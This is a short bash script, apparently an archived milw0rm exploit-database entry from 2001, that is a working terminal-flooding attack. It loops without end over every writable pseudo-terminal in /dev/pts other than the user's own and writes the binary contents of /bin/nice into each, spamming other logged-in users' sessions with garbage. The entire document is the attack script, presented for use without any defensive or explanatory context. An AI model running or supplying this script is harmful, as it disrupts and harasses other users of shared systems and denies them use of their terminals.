#!/bin/bash
#
# by teleh0r

TTYDIR=/dev/pts
NONSENSE=/bin/nice
MYTTY=`tty` # To prevent flooding of one's own TTY

while /bin/true ; do
    for i in $TTYDIR/* ; do
        if [ -w $i -a -c $i -a $i != $MYTTY ]; then
            cat $NONSENSE > $i
        fi
    done
done

unset i


# milw0rm.com [2001-01-02]